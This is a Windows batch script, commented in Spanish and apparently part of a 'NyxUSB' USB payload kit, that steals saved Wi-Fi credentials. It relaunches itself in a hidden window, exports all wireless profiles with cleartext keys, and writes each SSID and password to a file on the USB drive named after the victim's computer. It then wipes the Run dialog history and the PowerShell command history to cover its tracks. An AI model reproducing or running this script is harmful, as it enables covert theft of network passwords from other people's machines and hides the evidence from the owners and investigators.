@echo off

:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: ====================================================
::               RESOLUCION DINAMICA DE UNIDAD
:: ====================================================
:: Resuelve la ruta directamente desde la ubicacion del script (0 ms, sin PowerShell)
set "USB_ROOT=%~dp0"
set "FOLDER_DATA=%USB_ROOT%Data"

:: Si se ejecuta directamente desde la raiz del USB o desde payloads/wifi-extractor/
if exist "%USB_ROOT%..\..\Data" (
    set "FOLDER_DATA=%USB_ROOT%..\..\Data"
)

if not exist "%FOLDER_DATA%" (
    mkdir "%FOLDER_DATA%" 2>nul
)

:: Nombre de reporte con hostname para no sobreescribir extracciones de distintas maquinas
set "ARCHIVO_REPORTE=%FOLDER_DATA%\wifi_%COMPUTERNAME%.txt"

:: ====================================================
::        EXTRACCION AGNOSTICA DEL IDIOMA (XML)
:: ====================================================
echo =================================================== > "%ARCHIVO_REPORTE%"
echo NyxUSB - Reporte WiFi: %COMPUTERNAME% - %DATE% %TIME% >> "%ARCHIVO_REPORTE%"
echo =================================================== >> "%ARCHIVO_REPORTE%"

:: Exporta perfiles en XML (funciona en cualquier idioma de Windows: ES, EN, FR, etc.)
netsh wlan export profile folder="%TEMP%" key=clear >nul 2>&1

:: Procesa los XMLs, formatea credenciales y borra los archivos temporales
powershell -NoProfile -ExecutionPolicy Bypass -Command "$out = '%ARCHIVO_REPORTE%'; Get-ChildItem $env:TEMP -Filter 'Wi-Fi-*.xml' | ForEach-Object { try { [xml]$x = Get-Content $_.FullName; $s = $x.WLANProfile.SSIDConfig.SSID.name; $p = $x.WLANProfile.MSM.security.sharedKey.keyMaterial; if (-not $p) { $p = '[Red Abierta / Sin Clave]' }; Add-Content -Path $out -Value ('SSID: ' + $s + [Environment]::NewLine + 'PASS: ' + $p + [Environment]::NewLine + '-----------------------') } finally { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } }"

:: ====================================================
::               LIMPIEZA ANTI-FORENSE (OPSEC)
:: ====================================================
:: Borra el comando inyectado del historial de "Ejecutar" (Win + R)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1

:: Limpia el historial de comandos de PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1

exit